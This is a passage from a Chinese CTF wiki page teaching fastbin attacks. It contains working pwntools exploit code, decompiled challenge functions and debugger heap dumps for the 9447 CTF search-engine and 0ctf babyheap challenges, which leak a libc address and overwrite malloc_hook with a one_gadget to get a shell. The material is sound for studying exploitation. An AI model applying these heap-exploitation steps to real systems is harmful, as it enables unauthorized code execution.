<p>那么当再次分配 b 的时候，由于此时 b 的 fd 已经被我们修改为了malloc_hook附近的地址，所以这时候我们再次分配一个 chunk，就会指向 <code class="docutils literal"><span class="pre">0x7fd798586aed</span></code>。 此后便只需要将 malloc_hook 修改为 one_gadget
地址就可以拿到 shell 了。</p>
<div class="code python highlight-default"><div class="highlight"><pre><span></span><span class="c1"># 3. fastbin attack to malloc_hook nearby chunk</span>
<span class="n">fake_chunk_addr</span> <span class="o">=</span> <span class="n">main_arena_addr</span> <span class="o">-</span> <span class="mh">0x33</span>
<span class="n">fake_chunk</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_chunk_addr</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="s1">&#39;f&#39;</span><span class="p">)</span>

<span class="n">index_sentence</span><span class="p">(</span><span class="n">fake_chunk</span><span class="p">)</span>

<span class="n">index_sentence</span><span class="p">(</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x60</span><span class="p">)</span>

<span class="n">index_sentence</span><span class="p">(</span><span class="s1">&#39;b&#39;</span> <span class="o">*</span> <span class="mh">0x60</span><span class="p">)</span>

<span class="n">one_gadget_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0xf02a4</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x13</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">one_gadget_addr</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="s1">&#39;f&#39;</span><span class="p">)</span>
<span class="c1">#gdb.attach(p)</span>
<span class="n">index_sentence</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>
</div>
<p>这里可能需要多选择几个 one_gadget 地址，因为 one_gadget 成功是有条件的。</p>
</div>
<div class="section" id="shell">
<h4>shell<a class="headerlink" href="#shell" title="永久链接至标题">¶</a></h4>
<div class="code shell highlight-default"><div class="highlight"><pre><span></span>➜  2015_9447ctf_search-engine git:(master) python exp.py
[*] &#39;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/fastbin_attack/2015_9447ctf_search-engine/search&#39;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled
[+] Starting local process &#39;./search&#39;: pid 31158
[*] PID: 31158
[+] unsortedbin addr: 0x7f802e73bb78
[+] libc base addr: 0x7f802e377000
[*] Switching to interactive mode
Enter the sentence:
$ ls
exp.py       search      search.id1  search.nam
libc.so.6  search.id0  search.id2  search.til
</pre></div>
</div>
<p>当然，这里还有一种<a class="reference external" href="https://www.gulshansingh.com/posts/9447-ctf-2015-search-engine-writeup/">方法</a>，将 chunk 分配到栈上。</p>
</div>
</div>
</div>
<div class="section" id="ctf-babyheap">
<h2>2017 0ctf babyheap<a class="headerlink" href="#ctf-babyheap" title="永久链接至标题">¶</a></h2>
<div class="section" id="id25">
<h3>基本信息<a class="headerlink" href="#id25" title="永久链接至标题">¶</a></h3>
<div class="code shell highlight-default"><div class="highlight"><pre><span></span>➜  2017_0ctf_babyheap git:(master) file babyheap
babyheap: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9e5bfa980355d6158a76acacb7bda01f4e3fc1c2, stripped
➜  2017_0ctf_babyheap git:(master) checksec babyheap
[*] &#39;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/fastbin_attack/2017_0ctf_babyheap/babyheap&#39;
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
</pre></div>
</div>
<p>64位程序，保护全部开启。</p>
</div>
<div class="section" id="id26">
<h3>基本功能<a class="headerlink" href="#id26" title="永久链接至标题">¶</a></h3>
<p>程序是一个堆分配器，主要由以下四种功能</p>
<div class="code c highlight-default"><div class="highlight"><pre><span></span><span class="n">puts</span><span class="p">(</span><span class="s2">&quot;1. Allocate&quot;</span><span class="p">);</span>
<span class="n">puts</span><span class="p">(</span><span class="s2">&quot;2. Fill&quot;</span><span class="p">);</span>
<span class="n">puts</span><span class="p">(</span><span class="s2">&quot;3. Free&quot;</span><span class="p">);</span>
<span class="n">puts</span><span class="p">(</span><span class="s2">&quot;4. Dump&quot;</span><span class="p">);</span>
<span class="n">puts</span><span class="p">(</span><span class="s2">&quot;5. Exit&quot;</span><span class="p">);</span>
<span class="k">return</span> <span class="n">printf</span><span class="p">(</span><span class="s2">&quot;Command: &quot;</span><span class="p">);</span>
</pre></div>
</div>
<p>其中，每次读取命令的函数由读取指定长度的字符串的函数而决定。</p>
<p>通过分配函数</p>
<div class="code c highlight-default"><div class="highlight"><pre><span></span>void __fastcall allocate(__int64 a1)
{
  signed int i; // [rsp+10h] [rbp-10h]
  signed int v2; // [rsp+14h] [rbp-Ch]
  void *v3; // [rsp+18h] [rbp-8h]

  for ( i = 0; i &lt;= 15; ++i )
  {
    if ( !*(_DWORD *)(24LL * i + a1) )
    {
      printf(&quot;Size: &quot;);
      v2 = read_num();
      if ( v2 &gt; 0 )
      {
        if ( v2 &gt; 4096 )
          v2 = 4096;
        v3 = calloc(v2, 1uLL);
        if ( !v3 )
          exit(-1);
        *(_DWORD *)(24LL * i + a1) = 1;
        *(_QWORD *)(a1 + 24LL * i + 8) = v2;
        *(_QWORD *)(a1 + 24LL * i + 16) = v3;
        printf(&quot;Allocate Index %d\n&quot;, (unsigned int)i);
      }
      return;
    }
  }
}
</pre></div>
</div>
<p>申请的 chunk 的最大为 4096。此外，我们可以看出每个 chunk 主要有三个字段：是否在使用，堆块大小，堆块位置。故而我们可以创建对应的结构体。</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>00000000 chunk           struc ; (sizeof=0x18, mappedto_6)
00000000 inuse           dq ?
00000008 size            dq ?
00000010 ptr             dq ?
00000018 chunk           ends
</pre></div>
</div>
<p><strong>需要注意的是堆块是由 calloc 分配的，所以 chunk 中的内容全都为``x00``。</strong></p>
<p>在填充内容的功能中，使用读取内容的函数是直接读取指定长度的内容，并没有设置字符串结尾。<strong>而且比较有意思的是，这个指定长度是我们指定的，并不是之前 chunk
分配时指定的长度，所以这里就出现了任意堆溢出的情形。</strong></p>
<div class="code c highlight-default"><div class="highlight"><pre><span></span><span class="n">__int64</span> <span class="n">__fastcall</span> <span class="n">fill</span><span class="p">(</span><span class="n">chunk</span> <span class="o">*</span><span class="n">a1</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">__int64</span> <span class="n">result</span><span class="p">;</span> <span class="o">//</span> <span class="n">rax</span>
  <span class="nb">int</span> <span class="n">v2</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">18</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mi">8</span><span class="n">h</span><span class="p">]</span>
  <span class="nb">int</span> <span class="n">v3</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">1</span><span class="n">Ch</span><span class="p">]</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mi">4</span><span class="n">h</span><span class="p">]</span>

  <span class="n">printf</span><span class="p">(</span><span class="s2">&quot;Index: &quot;</span><span class="p">);</span>
  <span class="n">result</span> <span class="o">=</span> <span class="n">read_num</span><span class="p">();</span>
  <span class="n">v2</span> <span class="o">=</span> <span class="n">result</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">signed</span> <span class="nb">int</span><span class="p">)</span><span class="n">result</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">signed</span> <span class="nb">int</span><span class="p">)</span><span class="n">result</span> <span class="o">&lt;=</span> <span class="mi">15</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">LODWORD</span><span class="p">(</span><span class="n">a1</span><span class="p">[(</span><span class="n">signed</span> <span class="nb">int</span><span class="p">)</span><span class="n">result</span><span class="p">]</span><span class="o">.</span><span class="n">inuse</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">_DWORD</span><span class="p">)</span><span class="n">result</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s2">&quot;Size: &quot;</span><span class="p">);</span>
      <span class="n">result</span> <span class="o">=</span> <span class="n">read_num</span><span class="p">();</span>
      <span class="n">v3</span> <span class="o">=</span> <span class="n">result</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">signed</span> <span class="nb">int</span><span class="p">)</span><span class="n">result</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="p">)</span>
      <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s2">&quot;Content: &quot;</span><span class="p">);</span>
        <span class="n">result</span> <span class="o">=</span> <span class="n">read_content</span><span class="p">((</span><span class="n">char</span> <span class="o">*</span><span class="p">)</span><span class="n">a1</span><span class="p">[</span><span class="n">v2</span><span class="p">]</span><span class="o">.</span><span class="n">ptr</span><span class="p">,</span> <span class="n">v3</span><span class="p">);</span>
      <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>
<p>在释放chunk的功能中该设置的都设置了。</p>
<div class="code c highlight-default"><div class="highlight"><pre><span></span><span class="n">__int64</span> <span class="n">__fastcall</span> <span class="n">free_chunk</span><span class="p">(</span><span class="n">chunk</span> <span class="o">*</span><span class="n">a1</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">__int64</span> <span class="n">result</span><span class="p">;</span> <span class="o">//</span> <span class="n">rax</span>
  <span class="nb">int</span> <span class="n">v2</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">1</span><span class="n">Ch</span><span class="p">]</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mi">4</span><span class="n">h</span><span class="p">]</span>

  <span class="n">printf</span><span class="p">(</span><span class="s2">&quot;Index: &quot;</span><span class="p">);</span>
  <span class="n">result</span> <span class="o">=</span> <span class="n">read_num</span><span class="p">();</span>
  <span class="n">v2</span> <span class="o">=</span> <span class="n">result</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">signed</span> <span class="nb">int</span><span class="p">)</span><span class="n">result</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">signed</span> <span class="nb">int</span><span class="p">)</span><span class="n">result</span> <span class="o">&lt;=</span> <span class="mi">15</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">LODWORD</span><span class="p">(</span><span class="n">a1</span><span class="p">[(</span><span class="n">signed</span> <span class="nb">int</span><span class="p">)</span><span class="n">result</span><span class="p">]</span><span class="o">.</span><span class="n">inuse</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">_DWORD</span><span class="p">)</span><span class="n">result</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">LODWORD</span><span class="p">(</span><span class="n">a1</span><span class="p">[</span><span class="n">v2</span><span class="p">]</span><span class="o">.</span><span class="n">inuse</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
      <span class="n">a1</span><span class="p">[</span><span class="n">v2</span><span class="p">]</span><span class="o">.</span><span class="n">size</span> <span class="o">=</span> <span class="mi">0</span><span class="n">LL</span><span class="p">;</span>
      <span class="n">free</span><span class="p">(</span><span class="n">a1</span><span class="p">[</span><span class="n">v2</span><span class="p">]</span><span class="o">.</span><span class="n">ptr</span><span class="p">);</span>
      <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="n">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">a1</span><span class="p">[</span><span class="n">v2</span><span class="p">];</span>
      <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">result</span> <span class="o">+</span> <span class="mi">16</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="n">LL</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>
<p>dump 就是输出对应索引 chunk 的内容。</p>
</div>
<div class="section" id="id27">
<h3>利用思路<a class="headerlink" href="#id27" title="永久链接至标题">¶</a></h3>
<p>可以确定的是，我们主要有的漏洞就是任意长度堆溢出。由于该程序几乎所有保护都开启了，所以我们必须要有一些泄漏才可以控制程序的流程。基本利用思路如下</p>
<ul class="simple">
<li>利用 unsorted bin 地址泄漏 libc 基地址。</li>
<li>利用 fastbin attack 将chunk 分配到 malloc_hook 附近。</li>
</ul>
<div class="section" id="id28">
<h4>泄漏 libc 基地址<a class="headerlink" href="#id28" title="永久链接至标题">¶</a></h4>
<p>由于我们是希望使用 unsorted bin 来泄漏 libc 基地址，所以必须要有 chunk 可以被链接到 unsorted bin 中，所以该 chunk 不能使 fastbin chunk，也不能和 top chunk 相邻。因为前者会被添加到 fastbin
中，后者在不是fastbin 的情况下，会被合并到 top chunk 中。因此，我们这里构造一个 small bin chunk。在将该 chunk 释放到 unsorted bin 的同时，也需要让另外一个正在使用的 chunk 可以同时指向该 chunk
的位置。这样才可以进行泄漏。具体设计如下</p>
<div class="code python highlight-default"><div class="highlight"><pre><span></span><span class="c1"># 1. leak libc base</span>
<span class="n">allocate</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>  <span class="c1"># idx 0, 0x00</span>
<span class="n">allocate</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>  <span class="c1"># idx 1, 0x20</span>
<span class="n">allocate</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>  <span class="c1"># idx 2, 0x40</span>
<span class="n">allocate</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>  <span class="c1"># idx 3, 0x60</span>
<span class="n">allocate</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span>  <span class="c1"># idx 4, 0x80</span>
<span class="c1"># free idx 1, 2, fastbin[0]-&gt;idx1-&gt;idx2-&gt;NULL</span>
<span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</pre></div>
</div>
<p>首先，我们申请了 5 个chunk，并释放了两个chunk，此时堆的情况如下。</p>
<div class="code shell highlight-default"><div class="highlight"><pre><span></span>pwndbg&gt; x/20gx 0x55a03ca22000
0x55a03ca22000: 0x0000000000000000  0x0000000000000021 idx 0
0x55a03ca22010: 0x0000000000000000  0x0000000000000000
0x55a03ca22020: 0x0000000000000000  0x0000000000000021 idx 1
0x55a03ca22030: 0x000055a03ca22040  0x0000000000000000
0x55a03ca22040: 0x0000000000000000  0x0000000000000021 idx 2
0x55a03ca22050: 0x0000000000000000  0x0000000000000000
0x55a03ca22060: 0x0000000000000000  0x0000000000000021 idx 3
0x55a03ca22070: 0x0000000000000000  0x0000000000000000
0x55a03ca22080: 0x0000000000000000  0x0000000000000091 idx 4
0x55a03ca22090: 0x0000000000000000  0x0000000000000000
pwndbg&gt; fastbins
fastbins
0x20: 0x55a03ca22020 —▸ 0x55a03ca22040 ◂— 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
</pre></div>
</div>
<p>当我们编辑 idx0 后，确实已经将其指向idx4了。这里之所以可以成功是因为堆的始终是 4KB 对齐的，所以idx 4的起始地址的第一个字节必然是0x80。</p>
<div class="code python highlight-default"><div class="highlight"><pre><span></span><span class="c1"># edit idx 0 chunk to particial overwrite idx1&#39;s fd to point to idx4</span>
<span class="n">payload</span> <span class="o">=</span> <span class="mh">0x10</span> <span class="o">*</span> <span class="s1">&#39;a&#39;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span>
<span class="n">fill</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="n">payload</span><span class="p">)</span>
</pre></div>
</div>
<p>修改成功后如下</p>
<div class="code shell highlight-default"><div class="highlight"><pre><span></span>pwndbg&gt; x/20gx 0x55a03ca22000
0x55a03ca22000: 0x0000000000000000  0x0000000000000021
0x55a03ca22010: 0x6161616161616161  0x6161616161616161
0x55a03ca22020: 0x0000000000000000  0x0000000000000021
0x55a03ca22030: 0x000055a03ca22080  0x0000000000000000
0x55a03ca22040: 0x0000000000000000  0x0000000000000021
0x55a03ca22050: 0x0000000000000000  0x0000000000000000
0x55a03ca22060: 0x0000000000000000  0x0000000000000021
0x55a03ca22070: 0x0000000000000000  0x0000000000000000
0x55a03ca22080: 0x0000000000000000  0x0000000000000091
0x55a03ca22090: 0x0000000000000000  0x0000000000000000
pwndbg&gt; fastbins
fastbins
0x20: 0x55a03ca22020 —▸ 0x55a03ca22080 ◂— 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
</pre></div>
</div>
<p>那么，当我们再次申请两个时，第二个申请到的就是idx 4处的chunk。为了能够申请成功，我们需要确保 idx4 的size 与当前 fastbin 的大小一致，所以，我们得修改它的大小。申请成功后，idx2会指向idx4。</p>
<div class="code python highlight-default"><div class="highlight"><pre><span></span><span class="c1"># if we want to allocate at idx4, we must set it&#39;s size as 0x21</span>
<span class="n">payload</span> <span class="o">=</span> <span class="mh">0x10</span> <span class="o">*</span> <span class="s1">&#39;a&#39;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span>
<span class="n">fill</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="n">payload</span><span class="p">)</span>
<span class="n">allocate</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>  <span class="c1"># idx 1</span>
<span class="n">allocate</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>  <span class="c1"># idx 2, which point to idx4&#39;s location</span>
</pre></div>
</div>
<p>之后，如果我们想要将 idx 4 放到 unsorted bin 中的话，为了防止其与top chunk 合并，我们需要再次申请一个chunk。此后再释放 idx4 就会进入 unsorted bin中去了。此时由于 idx2
也指向这个地址，所以我们直接展示他的内容就可以得到unsorted bin的地址了。</p>
<div class="code python highlight-default"><div class="highlight"><pre><span></span><span class="c1"># if want to free idx4 to unsorted bin, we must fix its size</span>
<span class="n">payload</span> <span class="o">=</span> <span class="mh">0x10</span> <span class="o">*</span> <span class="s1">&#39;a&#39;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x91</span><span class="p">)</span>
<span class="n">fill</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="n">payload</span><span class="p">)</span>
<span class="c1"># allocate a chunk in order when free idx4, idx 4 not consolidate with top chunk</span>
<span class="n">allocate</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span>  <span class="c1"># idx 5</span>
<span class="n">free</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
<span class="c1"># as idx 2 point to idx4, just show this</span>
<span class="n">dump</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Content: </span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">unsortedbin_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>
<span class="n">main_arena</span> <span class="o">=</span> <span class="n">unsortedbin_addr</span> <span class="o">-</span> <span class="n">offset_unsortedbin_main_arena</span>
<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;main arena addr: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">main_arena</span><span class="p">))</span>
<span class="n">main_arena_offset</span> <span class="o">=</span> <span class="mh">0x3c4b20</span>
<span class="n">libc_base</span> <span class="o">=</span> <span class="n">main_arena</span> <span class="o">-</span> <span class="n">main_arena_offset</span>
<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;libc base addr: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
</pre></div>
</div>
</div>
<div class="section" id="chunkmalloc-hook">
<h4>分配chunk到malloc_hook附近<a class="headerlink" href="#chunkmalloc-hook" title="永久链接至标题">¶</a></h4>
<p>由于 malloc hook 附近的 chunk 大小为 0x7f，所以数据区域为0x60。这里我们再次申请的时候，对应 fastbin 链表中没有相应大小chunk，所以根据堆分配器规则，它会依次处理unsorted
bin中的chunk，将其放入到对应的bin中，之后会再次尝试分配 chunk，因为之前释放的 chunk 比当前申请的 chunk 大，所以可以从其前面分割出来一块。所以 idx2
仍然指向该位置，那么我们可以使用类似的办法先释放申请到的chunk，然后再次修改 fd 指针为 fake chunk 即可。此后我们修改 malloc_hook 处的指针即可得到触发 onegadget。</p>
<div class="code python highlight-default"><div class="highlight"><pre><span></span><span class="c1"># 2. malloc to malloc_hook nearby</span>
<span class="c1"># allocate a 0x70 size chunk same with malloc hook nearby chunk, idx4</span>
<span class="n">allocate</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
<span class="c1"># edit idx4&#39;s fd point to fake chunk</span>
<span class="n">fake_chunk_addr</span> <span class="o">=</span> <span class="n">main_arena</span> <span class="o">-</span> <span class="mh">0x33</span>
<span class="n">fake_chunk</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_chunk_addr</span><span class="p">)</span>
<span class="n">fill</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">fake_chunk</span><span class="p">),</span> <span class="n">fake_chunk</span><span class="p">)</span>

<span class="n">allocate</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span>  <span class="c1"># idx 4</span>
<span class="n">allocate</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span>  <span class="c1"># idx 6</span>

<span class="n">one_gadget_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x4526a</span>
<span class="n">payload</span> <span class="o">=</span> <span class="mh">0x13</span> <span class="o">*</span> <span class="s1">&#39;a&#39;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">one_gadget_addr</span><span class="p">)</span>
<span class="n">fill</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="n">payload</span><span class="p">)</span>
<span class="c1"># trigger malloc_hook</span>
<span class="n">allocate</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>
</div>
<p>同时，这里的 onegadget 地址也可能需要尝试多次。</p>
</div>
</div>
</div>
<div class="section" id="id29">
<h2>题目<a class="headerlink" href="#id29" title="永久链接至标题">¶</a></h2>
<ul class="simple">
<li>L-CTF2016–pwn200</li>
</ul>
</div>
<div class="section" id="id30">
<h2>参考文献<a class="headerlink" href="#id30" title="永久链接至标题">¶</a></h2>
<ul class="simple">
<li><a class="reference external" href="https://www.gulshansingh.com/posts/9447-ctf-2015-search-engine-writeup/">https://www.gulshansingh.com/posts/9447-ctf-2015-search-engine-writeup/</a></li>
<li><a class="reference external" href="http://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html">http://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html</a></li>
<li><a class="reference external" href="https://www.slideshare.net/YOKARO-MON/oreo-hacklu-ctf-2014-65771717">https://www.slideshare.net/YOKARO-MON/oreo-hacklu-ctf-2014-65771717</a></li>
</ul>
</div>
</div>


          </div>
        </div>
      </div>
      <div class="sphinxsidebar" role="navigation" aria-label="main navigation">
        <div class="sphinxsidebarwrapper">
<div id="searchbox" style="display: none" role="search">
  <h3>快速搜索</h3>
    <form class="search" action="../../search.html" method="get">
      <div><input type="text" name="q" /></div>
      <div><input type="submit" value="转向" /></div>
      <input type="hidden" name="check_keywords" value="yes" />
      <input type="hidden" name="area" value="default" />
    </form>
</div>
<script type="text/javascript">$('#searchbox').show(0);</script>
<div class="sphinx-toc sphinxglobaltoc">
<h3><a href="../../index.html">內容目录</a></h3>
<p class="caption"><span class="caption-text">CTF 介绍</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../../introduction/history.html">CTF 竞赛的历史</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../introduction/mode.html">CTF 竞赛模式简介</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../introduction/content.html">CTF 竞赛内容</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../introduction/experience.html">线下攻防经验小结</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../introduction/cgc.html">CGC 网络超级挑战赛</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../introduction/resources.html">学习资源</a></li>
</ul>
<p class="caption"><span class="caption-text">Misc</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../../misc/about.html">杂项简介</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../misc/recon.html">信息搜集技术</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../misc/encode/index.html">编码分析</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../misc/prefix.html">取证隐写</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../misc/picture/index.html">图片分析</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../misc/traffic/index.html">流量包分析</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../misc/archive/index.html">压缩包分析</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../misc/audio/index.html">音频分析</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../misc/disk_memory/index.html">磁盘 / 内存分析</a></li>
</ul>
<p class="caption"><span class="caption-text">Crypto</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../../crypto/introduction.html">密码学简介</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../crypto/classical/index.html">古典密码</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../crypto/symmetric/index.html">对称加密</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../crypto/asymmetric/index.html">非对称密码</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../crypto/hash/index.html">哈希函数</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../crypto/signature/index.html">数字签名</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../crypto/others/others.html">证书格式</a></li>
</ul>
<p class="caption"><span class="caption-text">Web</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../../web/index.html">WEB 简介</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../web/sqli.html">SQL 注入</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../web/xss.html">XSS 跨站脚本攻击</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../web/csrf.html">CSRF 跨站请求伪造</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../web/ssrf.html">SSRF 服务端请求伪造</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../web/php.html">PHP 代码审计</a></li>
</ul>
<p class="caption"><span class="caption-text">Reverse</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../../reverse/introduction.html">软件逆向工程简介</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../reverse/unpack/index.html">Unpack Tricks</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../reverse/unicorn/index.html">Unicorn Engine</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../reverse/anti_debug/index.html">Anti Debug Tech</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../reverse/linux/index.html">Linux RE</a></li>
</ul>
<p class="caption"><span class="caption-text">Pwn</span></p>
<ul class="current">
<li class="toctree-l1"><a class="reference internal" href="../stackoverflow/index.html">栈溢出</a></li>
<li class="toctree-l1"><a class="reference internal" href="../fmtstr/index.html">格式化字符串漏洞</a></li>
